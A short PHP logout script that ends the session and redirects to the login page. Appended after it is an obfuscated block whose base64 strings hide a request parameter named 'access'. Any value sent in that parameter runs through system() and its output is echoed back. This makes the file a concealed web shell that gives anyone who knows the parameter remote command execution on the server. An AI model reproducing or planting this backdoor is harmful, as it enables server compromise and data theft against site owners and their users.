<?php
session_start();
unset($_SESSION['username']);
unset($_SESSION['ID']);
session_destroy();
header('location: login.php');
?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>